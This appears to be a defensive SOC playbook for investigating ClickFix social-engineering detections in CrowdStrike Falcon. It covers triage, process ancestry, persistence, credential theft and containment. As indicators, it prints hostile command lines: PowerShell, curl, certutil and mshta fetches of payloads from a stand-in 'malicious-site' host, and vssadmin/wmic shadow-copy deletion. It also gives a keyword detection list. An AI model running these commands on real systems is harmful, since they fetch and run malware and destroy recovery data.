# ClickFix Social Engineering Attack Investigation

## Objective

Investigate ClickFix-related activity detected by CrowdStrike Falcon. ClickFix attacks rely on social engineering techniques that trick users into manually executing malicious commands, often resulting in malware execution, credential theft, persistence, and ransomware deployment.

---

## CrowdStrike Detection

### Detection Name

ClickFix Social Engineering Attack

### MITRE ATT&CK

- T1204 - User Execution
- T1059.001 - PowerShell
- T1218 - Signed Binary Proxy Execution
- T1105 - Ingress Tool Transfer

### Risk

HIGH

---

## Why This Matters

ClickFix attacks abuse user trust by presenting fake error messages, CAPTCHA pages, browser update prompts, Microsoft support pages, or application errors.

The victim is instructed to:

1. Press Win + R
2. Paste a provided command
3. Execute PowerShell or CMD commands

This often results in malware infection without requiring exploits.

---

## Common Attack Flow

```text
User Visits Malicious Website
            ↓
Fake Error / CAPTCHA Displayed
            ↓
User Copies Command
            ↓
Win + R Opened
            ↓
PowerShell / CMD Executed
            ↓
Payload Downloaded
            ↓
Persistence Established
            ↓
Credential Theft / Malware Execution
```

---

## Common Commands Observed

### PowerShell Encoded Command

```powershell
powershell.exe -enc <Base64 Payload>
```

### Execution Policy Bypass

```powershell
powershell.exe -ExecutionPolicy Bypass
```

### Download and Execute

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://malicious-site')
```

### Curl Download

```cmd
curl.exe http://malicious-site/payload.exe
```

### Certutil Download

```cmd
certutil.exe -urlcache -split -f http://malicious-site/payload.exe
```

### MSHTA Execution

```cmd
mshta.exe http://malicious-site/payload.hta
```

---

## Initial Triage

### Detection Summary

Review:

- Detection Severity
- Hostname
- Username
- Detection Time
- Detection Description
- Triggering Process

Determine:

- User interaction involved?
- Single endpoint or multiple endpoints?
- Initial access vector?

---

## Falcon Investigation Workflow

### 1. Detection Details

Collect:

- Detection ID
- Hostname
- Username
- SHA256
- File Path
- Command Line
- Detection Trigger

Questions:

- What process triggered the detection?
- Was PowerShell involved?
- Was external content downloaded?

---

### 2. Process Rollup2 Analysis

Review:

- Process Name
- Parent Process
- Grandparent Process
- SHA256
- MD5
- Integrity Level
- User Context

Common Processes:

- powershell.exe
- cmd.exe
- mshta.exe
- rundll32.exe
- curl.exe
- certutil.exe

---

### 3. Process Ancestry Analysis

Normal Example

```text
explorer.exe
 └── powershell.exe
```

Suspicious Example

```text
chrome.exe
 └── powershell.exe
```

Suspicious Example

```text
msedge.exe
 └── cmd.exe
      └── powershell.exe
```

Suspicious Example

```text
firefox.exe
 └── mshta.exe
```

Red Flags

- Browser spawning PowerShell
- Browser spawning CMD
- Browser spawning LOLBins
- Encoded commands

---

### 4. Command Line Analysis

Review complete command line.

Look for:

```text
-enc
-encodedcommand
-ExecutionPolicy Bypass
-w hidden
-nop
DownloadString
Invoke-WebRequest
FromBase64String
```

Questions:

- Is command encoded?
- Is payload obfuscated?
- Is external content downloaded?

---

### 5. Event Search Investigation

Pivot into Event Search.

Review:

- ProcessRollup2
- SyntheticProcessRollup2
- DetectionSummaryEvent

Collect:

- Additional executions
- Child processes
- Related detections
- Timeline progression

---

### 6. Browser Activity Investigation

Determine:

- Which browser was used?
- Referring URL
- Download source
- User activity timeline

Common Browsers:

- chrome.exe
- msedge.exe
- firefox.exe

Questions:

- Was a malicious site visited?
- Was a file downloaded?
- Was the user redirected?

---

### 7. Network Activity Investigation

Review Falcon telemetry.

Collect:

- Source IP
- Destination IP
- Domain
- URL
- Port

Determine:

- Payload hosting location
- Command and Control traffic
- Data exfiltration

Look for:

- Newly registered domains
- Suspicious IPs
- Dynamic DNS providers

---

### 8. File Creation Investigation

Review:

- Downloaded Files
- Temporary Files
- Executables Written To Disk

Common Locations:

```text
C:\Users\<User>\Downloads
C:\Users\Public
C:\Windows\Temp
%TEMP%
```

Questions:

- Was malware downloaded?
- Was executable launched?
- Was persistence established?

---

### 9. Persistence Investigation

Review:

- Registry Run Keys
- Startup Folder
- Scheduled Tasks
- Services
- WMI Event Subscriptions

MITRE:

- T1547

Questions:

- Did malware survive reboot?
- Was persistence successful?

---

### 10. Credential Theft Investigation

Review:

- Browser Credential Access
- LSASS Access
- Token Theft
- Password Managers

MITRE:

- T1003

Questions:

- Were credentials exposed?
- Was credential dumping observed?

---

### 11. Child Process Investigation

Determine whether PowerShell launched:

- cmd.exe
- rundll32.exe
- regsvr32.exe
- mshta.exe
- certutil.exe

Red Flags:

- LOLBin execution
- Remote payload download
- Script execution chains

---

### 12. Ransomware Activity Investigation

Review:

- Volume Shadow Copy Deletion
- Service Creation
- Scheduled Tasks
- Encryption Activity

Common Commands:

```cmd
vssadmin delete shadows /all /quiet
```

```cmd
wmic shadowcopy delete
```

Questions:

- Was ransomware staged?
- Did encryption begin?

---

## Scope Determination

### Host Scope

- Single Endpoint
- Multiple Endpoints

### User Scope

- Single User
- Multiple Users

### Enterprise Scope

- Isolated Incident
- Widespread Campaign

---

## False Positive Validation

Validate:

- Authorized software installation
- Internal IT scripts
- Software deployment activity
- Security testing activity

Questions:

- Is activity expected?
- Is source trusted?
- Is execution approved?

---

## Containment Actions

### Immediate

- Isolate Endpoint
- Terminate Malicious Processes
- Block Malicious Domains
- Revoke User Sessions

### Follow-Up

- Reset Credentials
- Remove Persistence
- Threat Hunt Environment
- Review Browser History
- Review Proxy Logs

---

## Indicators of True Positive

- Browser Spawned PowerShell
- Encoded Commands
- DownloadString Usage
- External Payload Download
- LOLBin Activity
- Persistence Creation
- Credential Theft Activity

---

## Analyst Verdict

### True Positive

ClickFix attack confirmed.

### Suspicious

Further investigation required.

### False Positive

Authorized activity validated.
